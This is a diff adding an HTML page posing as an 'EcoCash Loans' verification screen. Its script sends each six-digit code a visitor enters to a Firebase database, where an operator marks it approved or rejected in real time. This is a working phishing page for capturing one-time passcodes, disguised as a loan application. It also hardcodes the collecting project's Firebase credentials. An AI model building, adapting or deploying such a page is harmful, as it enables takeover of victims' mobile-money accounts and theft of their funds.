@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EcoCash Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Poppins,sans-serif;
+}
+body{
+background:linear-gradient(180deg,#2563eb,#1e3a8a);
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+padding:20px;
+}
+.card{
+width:100%;
+max-width:420px;
+background:#fff;
+border-radius:28px;
+padding:30px;
+box-shadow:0 20px 45px rgba(0,0,0,.18);
+text-align:center;
+}
+.logo{
+font-size:34px;
+font-weight:700;
+margin-bottom:10px;
+}
+.eco{color:#2563eb;}
+.fund{color:#06b6d4;}
+h2{
+margin-top:10px;
+margin-bottom:10px;
+}
+p{
+color:#666;
+margin-bottom:25px;
+font-size:15px;
+}
+.otp{
+display:flex;
+justify-content:space-between;
+gap:10px;
+margin-bottom:25px;
+}
+.otp input{
+width:52px;
+height:58px;
+border:2px solid #ddd;
+border-radius:14px;
+font-size:24px;
+font-weight:700;
+text-align:center;
+outline:none;
+transition:.25s;
+}
+.otp input:focus{
+border-color:#2563eb;
+}
+button{
+width:100%;
+padding:16px;
+border:none;
+border-radius:15px;
+background:#2563eb;
+color:#fff;
+font-size:18px;
+font-weight:600;
+cursor:pointer;
+transition:.3s;
+}
+button:disabled{
+opacity:.7;
+cursor:not-allowed;
+}
+.timer{
+margin-top:18px;
+font-size:15px;
+color:#666;
+}
+.timer a{
+color:#2563eb;
+text-decoration:none;
+font-weight:600;
+pointer-events:none;
+opacity:.5;
+}
+.timer a.active{
+pointer-events:auto;
+opacity:1;
+}
+
+/* Toast Notification - TOP */
+#toast{
+position:fixed;
+top:-100px;
+left:50%;
+transform:translateX(-50%);
+background:#1e3a8a;
+color:#fff;
+padding:16px 24px;
+border-radius:14px;
+font-weight:500;
+z-index:999;
+transition: top 0.4s ease;
+box-shadow:0 8px 20px rgba(0,0,0,.25);
+text-align:center;
+max-width:90%;
+}
+#toast.show{
+top:30px;
+}
+
+/* Success banner */
+.success-box{
+display:none;
+background:#f0fff4;
+border:2px solid #22c55e;
+color:#15803d;
+padding:18px;
+border-radius:16px;
+margin-bottom:20px;
+font-weight:500;
+}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<span class="eco">Eco</span><span class="fund">Cash</span>
+</div>
+
+<div id="successBox" class="success-box">
+✅ Code Verified! <br>
+Please wait for approval. You will receive a notification when your loan is approved.
+</div>
+
+<h2 id="title">Verification Code</h2>
+<p id="subtitle">Enter the 6-digit verification code.</p>
+
+<div id="otpSection">
+  <div class="otp">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+    <input maxlength="1">
+  </div>
+  <button id="verifyBtn">Verify</button>
+  <div class="timer">
+    Resend code in <span id="count">60</span>s<br><br>
+    <a href="#" id="resend">Resend Code</a>
+  </div>
+</div>
+
+</div>
+<div id="toast"></div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDbx8tqZiN7xqUmj-obf1LwroYTV8FuRrk",
+  authDomain: "ecocash-loans-b8ff4.firebaseapp.com",
+  databaseURL: "https://ecocash-loans-b8ff4-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "ecocash-loans-b8ff4",
+  storageBucket: "ecocash-loans-b8ff4.firebasestorage.app",
+  messagingSenderId: "965007030441",
+  appId: "1:965007030441:web:fd828795a365eca5ab11b8",
+  measurementId: "G-XCZW21GNZ8"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
+const verifyRef = db.ref('verifications/' + sessionId);
+
+const inputs = document.querySelectorAll(".otp input");
+
+inputs.forEach((input,index)=>{
+  input.addEventListener("input",()=>{
+    input.value = input.value.replace(/\D/g,"");
+    if(input.value && index < 5){
+      inputs[index+1].focus();
+    }
+  });
+  input.addEventListener("keydown",(e)=>{
+    if(e.key === "Backspace" && input.value === "" && index > 0){
+      inputs[index-1].focus();
+    }
+  });
+});
+
+function toast(msg){
+  const t = document.getElementById("toast");
+  t.innerText = msg;
+  t.classList.add("show");
+  setTimeout(()=>{ t.classList.remove("show"); }, 4000);
+}
+
+// Listen for real-time status updates
+verifyRef.child('status').on('value', (snapshot)=>{
+  const status = snapshot.val();
+  if(status === 'approved'){
+    document.getElementById("successBox").style.display = "block";
+    document.getElementById("otpSection").style.display = "none";
+    document.getElementById("title").innerText = "Submitted";
+    document.getElementById("subtitle").innerText = "Your verification is complete.";
+    toast("I'm the motivation. Please wait for approval. You will receive a notification when your loan is approved.");
+  }
+  if(status === 'rejected'){
+    toast("Invalid code. Please try again.");
+    document.getElementById("verifyBtn").disabled = false;
+    document.getElementById("verifyBtn").innerText = "Verify";
+    inputs.forEach(i => i.value = "");
+    inputs[0].focus();
+  }
+});
+
+document.getElementById("verifyBtn").onclick = ()=>{
+  let code = "";
+  inputs.forEach(i => code += i.value);
+  if(code.length!== 6){
+    toast("Enter the complete verification code.");
+    return;
+  }
+  const btn = document.getElementById("verifyBtn");
+  btn.disabled = true;
+  btn.innerText = "Verifying...";
+
+  verifyRef.set({
+    code: code,
+    createdAt: firebase.database.ServerValue.TIMESTAMP,
+    status: 'pending'
+  }).then(()=>{
+    btn.innerText = "Submitted";
+    toast("Application Received. You will receive a notification when your loan is approved.");
+  }).catch(err=>{
+    toast("Error: " + err.message);
+    btn.disabled = false;
+    btn.innerText = "Verify";
+  });
+};
+
+// Timer logic
+let seconds = 60;
+const count = document.getElementById("count");
+const resend = document.getElementById("resend");
+let timer;
+
+function startTimer(){
+  clearInterval(timer);
+  seconds = 60;
+  count.innerText = seconds;
+  resend.classList.remove("active");
+  timer = setInterval(()=>{
+    seconds--;
+    count.innerText = seconds;
+    if(seconds <= 0){
+      clearInterval(timer);
+      count.innerText = "0";
+      resend.classList.add("active");
+    }
+  },1000);
+}
+startTimer();
+
+resend.onclick = (e)=>{
+  e.preventDefault();
+  if(!resend.classList.contains("active")) return;
+  db.ref('resendRequests/' + sessionId).set({
+    requestedAt: firebase.database.ServerValue.TIMESTAMP
+  });
+  toast("Requesting a new verification code...");
+  startTimer();
+};
+</script>
+</body>
+</html>
